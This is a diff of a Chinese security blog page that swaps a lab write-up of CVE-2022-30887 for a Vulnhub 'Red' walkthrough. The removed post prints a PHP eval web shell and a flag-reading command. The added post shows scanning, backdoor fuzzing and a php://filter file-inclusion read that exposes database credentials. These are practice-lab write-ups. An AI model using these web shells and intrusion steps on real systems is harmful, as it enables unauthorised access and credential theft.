@@ -9,7 +9,7 @@
     
     <title>
         
-            CVE-2022-30887 |
+            Vulnhub Red |
         
         ~是我呀
     </title>
@@ -159,7 +159,7 @@
         <div class="article-content-container">
 
             <div class="article-title">
-                <span class="title-hover-animation">CVE-2022-30887</span>
+                <span class="title-hover-animation">Vulnhub Red</span>
             </div>
 
             
@@ -181,13 +181,13 @@
         
             <i class="fa-regular fa-calendar-plus"></i>&nbsp;
         
-        <span class="pc">2023-05-04 11:21:01</span>
-        <span class="mobile">2023-05-04 11:21</span>
+        <span class="pc">2023-05-07 18:24:19</span>
+        <span class="mobile">2023-05-07 18:24</span>
     </span>
     
         <span class="article-update-date article-meta-item">
         <i class="fas fa-file-pen"></i>&nbsp;
-        <span class="pc">2023-05-08 21:27:02</span>
+        <span class="pc">2023-05-07 21:26:21</span>
     </span>
     
     
@@ -196,7 +196,7 @@
             <ul>
                 
                     <li>
-                        <a href="/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-com/">春秋云境.com</a>&nbsp;
+                        <a href="/categories/Vulnhub/">Vulnhub</a>&nbsp;
                     </li>
                 
             </ul>
@@ -211,10 +211,6 @@
                         <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>&nbsp;
                     </li>
                 
-                    <li>
-                        | <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a>&nbsp;
-                    </li>
-                
             </ul>
         </span>
     
@@ -222,12 +218,12 @@
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fas fa-file-word"></i>&nbsp;<span>595 字</span>
+            <i class="fas fa-file-word"></i>&nbsp;<span>889 字</span>
         </span>
     
     
         <span class="article-min2read article-meta-item">
-            <i class="fas fa-clock"></i>&nbsp;<span>2 分钟</span>
+            <i class="fas fa-clock"></i>&nbsp;<span>4 分钟</span>
         </span>
     
     
@@ -245,42 +241,103 @@
             <div class="article-content keep-markdown-body">
                 
 
-                <h1 id="CVE-2022-30887"><a href="#CVE-2022-30887" class="headerlink" title="CVE-2022-30887"></a>CVE-2022-30887</h1><blockquote>
-<p>写在前面：这一篇是拿来用hexo自制博客模板写博客的测试。</p>
-</blockquote>
-<p>靶标介绍：多语言药房管理系统 (MPMS) 是用 PHP 和 MySQL 开发的, 该软件的主要目的是在药房和客户之间提供一套接口，客户是该软件的主要用户。该软件有助于为药房业务创建一个综合数据库，并根据到期、产品等各种参数提供各种报告。 该CMS中php_action&#x2F;editProductImage.php存在任意文件上传漏洞，进而导致任意代码执行。</p>
-<h2 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h2><ol>
-<li>进入靶场，首先是一个登录界面，随便输入一个邮箱和密码，根据提示查看页面源码，密码框只允许小写字母，修改密码为纯小写字母后，登录报错“邮箱不存在”，所以可以爆破一下邮箱，但是，还没有到爆破那一步。</li>
-</ol>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.staticaly.com/gh/Shienmy/picx-images-hosting@master/CVE(1).2br2zd99muv4.jpg"
-                      alt="CVE(1)"
-                ></p>
-<ol>
-<li><p>页面下方有个网页提供商的超链接，点击进入，使用内容查找，检索 “pharma”，找到 Best Pharmacy Billing Software Free Download，点击进入，弹出一个图片，图片上有一个邮箱：<code>mayuri.infospace@gmail.com</code>，用这个邮箱测试一下登录邮箱，登录报错改变了：“邮箱或密码错误”，说明这个邮箱是已经注册过该系统的。开始找密码。<br><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.staticaly.com/gh/Shienmy/picx-images-hosting@master/CVE(2).6pcdqv4ew2s0.jpg"
-                      alt="CVE(2)"
-                ></p>
+                <h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>工具储备：目录扫描工具、参数Fuzz工具、后门字典、爆破参数字典、hashcat、hydra等</p>
+<h1 id="发现主机"><a href="#发现主机" class="headerlink" title="发现主机"></a>发现主机</h1><p>kali:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">arp-scan -I eth0 -l</span><br></pre></td></tr></table></figure>
+<p>发现目标主机IP：<code>192.168.56.101  08:00:27:89:06:41       (Unknown)</code></p>
+<h1 id="扫描端口"><a href="#扫描端口" class="headerlink" title="扫描端口"></a>扫描端口</h1><p>kali：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -A -sA -T4 192.168.56.101</span><br></pre></td></tr></table></figure>
+<p>扫描结果：</p>
+<pre><code># Nmap 7.93 scan initiated Sun May  7 05:58:14 2023 as: nmap -sV -A -T4 -oN red_vuln.txt 192.168.56.101
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Nmap scan report for 192.168.56.101
+Host is up (0.00088s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 8d5365835252c4127249be335dd1e71c (RSA)
+|   256 06610a49864364cab00c0f09177b33ba (ECDSA)
+|_  256 9b8d90472ac1dc11287d57e08a23b469 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-generator: WordPress 5.8.1
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+| http-robots.txt: 1 disallowed entry 
+|_/wp-admin/
+|_http-title: Hacked By Red &amp;#8211; Your site has been Hacked! You\xE2\x80\x99ll neve...
+MAC Address: 08:00:27:89:06:41 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.88 ms 192.168.56.101
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun May  7 05:58:22 2023 -- 1 IP address (1 host up) scanned in 8.62 seconds
+</code></pre>
+<ul>
+<li>OpenSSH v8.2p1</li>
+<li>Apache 2.4.41<ul>
+<li>robot.txt</li>
+</ul>
 </li>
-<li><p>原本想着爆破，但是社工属性的密码我还没尝试过。根据邮箱试试密码：<br>  mayuri，mayurik，您猜怎么着？密码<code>mayurik</code>，成功登录.<br>  <img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.staticaly.com/gh/Shienmy/picx-images-hosting@master/CVE(3).2g38vso8ksu8.jpg"
-                      alt="CVE(3)"
-                ></p>
+<li>Wordpress 5.8.1<ul>
+<li>&#x2F;wp-admin&#x2F;</li>
+</ul>
 </li>
-<li><p>点击Medicine-&gt;Manage Medicine或者右侧 Totol Manufacturer，进入药品管理列表。随机找一个药品，修改图像或者创建一个药品上传php木马。</p>
- <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># GET 也行</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p> 这里的文件上传没有限制，直接上传成功。</p>
-</li>
-<li><p>flag 就在根目录，用蚁剑连接POST类型木马，或者用GET请求去连接GET型木马。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=tac /f*</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个漏洞是春秋云境的免费靶标，难度不大。攻克这个靶标需要手工去找这个CMS系统的默认账号密码，在这里根据页面提供的连接去验证一个个可能的信息。对于开源的系统，可以去Github或其官方网站搜索账号密码或者下载源码分析。</p>
+</ul>
+<h1 id="服务信息收集"><a href="#服务信息收集" class="headerlink" title="服务信息收集"></a>服务信息收集</h1><h2 id="Web服务信息收集"><a href="#Web服务信息收集" class="headerlink" title="Web服务信息收集"></a>Web服务信息收集</h2><p>访问：<code>http://192.168.56.101</code>，进入没有渲染的页面，点击页面的某些连接，转到<code>redrocks.win</code>域名。所以先在<code>/etc/hosts</code>中添加<code>192.168.56.101  redrocks.win</code>的记录。重新访问<code>http://redrocks.win</code></p>
+<p>页面显示：</p>
+<pre><code>Hacked By Red
+
+Your site has been Hacked! You’ll never find the backdoor hahahah
+</code></pre>
+<p>说明该网站已经被黑入后门了。</p>
+<p>简单的目录扫描：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># kali, 2022</span></span><br><span class="line">pip install dirsearch</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> .<span class="built_in">local</span>/bin/</span><br><span class="line"></span><br><span class="line">./dirsearch -u http://redrocks.win -e php</span><br></pre></td></tr></table></figure>
+<p>扫出一些目录，但均无帮助。所以我这里就不列出我的结果了。</p>
+<p>在不使用以及猜测弱口令多半行不通的情况下，我不会了，去参考了大佬们的做法，才发现还是自己信息收集做得不到位，在<code>http://redrocks.win/2021/10/24/hello-world/</code>源码中有一行注释：</p>
+<pre><code> Still Looking For It? Maybe you should ask Mr. Miessler for help, not that it matters, you won&#39;t be able to read anything with it anyway 
+</code></pre>
+<p>我已经告诉你们在哪了，自己去找吧。</p>
+<p>搜索引擎搜索：Mr. Miessler，找到 Miessler Github主页，他有一个 Seclists 仓库。里面包含了许多用于安全测试的字典，搜索找到关于PHP后门的字典<code>CommonBackdoors-PHP.fuzz.txt</code>。</p>
+<pre><code>apt -y install seclists
+# 或者
+git clone https://github.com/danielmiessler/SecLists.git
+</code></pre>
+<p>使用<code>dirsearch</code>，使用字典<code>CommonBackdoors-PHP.fuzz.txt</code></p>
+<pre><code>./dirsearch -u http://redrocks.win/ -w your_path/CommonBackdoors-PHP.fuzz.txt
+</code></pre>
+<p>扫描结果：</p>
+<pre><code>Target: http://redrocks.win/
+
+[08:49:46] Starting:                                                         
+[08:49:50] 500 -    0B  - /NetworkFileManagerPHP.php
+
+Task Completed   
+</code></pre>
+<p>该文件的状态码为500，，则可以猜测该文件存在文件包含，所以来Fuzz一下该文件存在的接口参数。</p>
+<p>使用 ffuf 工具来Fuzz接口参数，使用<code>Seclists/Discovery/Web-Content/burp-parameter-names.txt</code>字典：</p>
+<pre><code>ffuf -c -ac -u http://redrocks.win/NetworkFileManagerPHP.php?FUZZ=123 -w &#39;your_path/burp-parameter-names.txt&#39;
+</code></pre>
+<p>验证到接口参数 key</p>
+<p>使用<code>php://filter/convert.base64-encode/resource=</code>来读取文件内容。</p>
+<p>读取 NetworkFileManagerPHP.php 内容，里面有加密内容，base64解密后获得提示：<code>That password alone won’t help you! Hashcat says rules are rules</code></p>
+<p>访问到 wp-config.php 的内容，经base64解密后得到：<br>    define( ‘DB_NAME’, ‘wordpress’ );</p>
+<pre><code>/** MySQL database username */
+
+define( &#39;DB_USER&#39;, &#39;john&#39; );
+
+/** MySQL database password */
+
+define( &#39;DB_PASSWORD&#39;, &#39;R3v_m4lwh3r3_k1nG!!&#39; );
+</code></pre>
+<p>等。</p>
 
             </div>
 
@@ -290,16 +347,16 @@
 <div class="article-copyright-info-container">
     <ul class="copyright-info-content">
         <li class="post-title">
-            <span class="type">本文标题</span>：<span class="content">CVE-2022-30887</span>
+            <span class="type">本文标题</span>：<span class="content">Vulnhub Red</span>
         </li>
         <li class="post-author">
             <span class="type">本文作者</span>：<span class="content">seconme</span>
         </li>
         <li class="post-time">
-            <span class="type">创建时间</span>：<span class="content">2023-05-04 11:21:01</span>
+            <span class="type">创建时间</span>：<span class="content">2023-05-07 18:24:19</span>
         </li>
         <li class="post-link">
-            <span class="type">本文链接</span>：<span class="content">2023/05/04/CVE-2022-30887/</span>
+            <span class="type">本文链接</span>：<span class="content">2023/05/07/Vulnhub-Red/</span>
         </li>
         <li class="post-license">
             <span class="type">版权声明</span>：<span class="content">本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！</span>
@@ -320,10 +377,6 @@
                             <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">#漏洞复现</a>&nbsp;
                         </li>
                     
-                        <li class="tag-item">
-                            <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">#文件上传</a>&nbsp;
-                        </li>
-                    
                 </ul>
             
 
@@ -333,13 +386,13 @@
                         <div class="article-prev">
                             <a class="prev"
                                rel="prev"
-                               href="/2023/05/04/CVE-2022-29464/"
+                               href="/2023/05/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2-%E6%94%BB%E5%85%8B%E8%AE%B0%E5%BD%95/"
                             >
                             <span class="left arrow-icon flex-center">
                               <i class="fas fa-chevron-left"></i>
                             </span>
                                 <span class="title flex-center">
-                                <span class="post-nav-title-item">CVE-2022-29464</span>
+                                <span class="post-nav-title-item">红日靶场2-攻克记录</span>
                                 <span class="post-nav-item">上一篇</span>
                             </span>
                             </a>
@@ -349,10 +402,10 @@
                         <div class="article-next">
                             <a class="next"
                                rel="next"
-                               href="/2023/05/03/SSRF%E5%9F%BA%E7%A1%80/"
+                               href="/2023/05/07/CVE-2022-26965/"
                             >
                             <span class="title flex-center">
-                                <span class="post-nav-title-item">SSRF基础</span>
+                                <span class="post-nav-title-item">CVE-2022-26965</span>
                                 <span class="post-nav-item">下一篇</span>
                             </span>
                                 <span class="right arrow-icon flex-center">
@@ -430,7 +483,7 @@
             <div class="toc-content-container">
                 <div class="post-toc-wrap">
     <div class="post-toc">
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2022-30887"><span class="nav-number">1.</span> <span class="nav-text">CVE-2022-30887</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B"><span class="nav-number">1.1.</span> <span class="nav-text">测试过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">1.2.</span> <span class="nav-text">总结</span></a></li></ol></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%87%86%E5%A4%87"><span class="nav-number">1.</span> <span class="nav-text">准备</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%91%E7%8E%B0%E4%B8%BB%E6%9C%BA"><span class="nav-number">2.</span> <span class="nav-text">发现主机</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3"><span class="nav-number">3.</span> <span class="nav-text">扫描端口</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">4.</span> <span class="nav-text">服务信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web%E6%9C%8D%E5%8A%A1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">4.1.</span> <span class="nav-text">Web服务信息收集</span></a></li></ol></li></ol>
     </div>
 </div>
 
